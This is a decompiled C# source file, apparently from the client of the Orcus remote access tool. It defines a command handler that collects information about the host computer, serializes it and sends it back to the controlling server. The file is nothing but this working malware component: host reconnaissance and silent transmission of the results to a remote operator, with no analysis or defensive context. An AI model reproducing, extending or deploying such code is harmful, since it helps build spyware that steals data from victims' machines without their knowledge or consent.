using System;
using System.Text;
using Orcus.CommandManagement;
using Orcus.Plugins;
using Orcus.Shared.Commands.ComputerInformation;
using Orcus.Shared.Connection;
using Orcus.Shared.NetSerializer;

namespace Orcus.Commands.ComputerInformation;

internal class ComputerInformation : Command
{
	public override void ProcessCommand(byte[] parameter, IConnectionInfo connectionInfo)
	{
		//IL_002c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		ComputerInformation information;
		try
		{
			information = InformationCollector.GetInformation();
		}
		catch (Exception ex)
		{
			connectionInfo.CommandFailed((Command)(object)this, Encoding.UTF8.GetBytes(ex.Message));
			return;
		}
		Serializer val = new Serializer(typeof(ComputerInformation));
		((ConnectionInfo)(object)connectionInfo).SendServerPackage((ServerPackageType)1, val.Serialize((object)information), redirectPackage: true);
	}

	protected override uint GetId()
	{
		return 4u;
	}
}
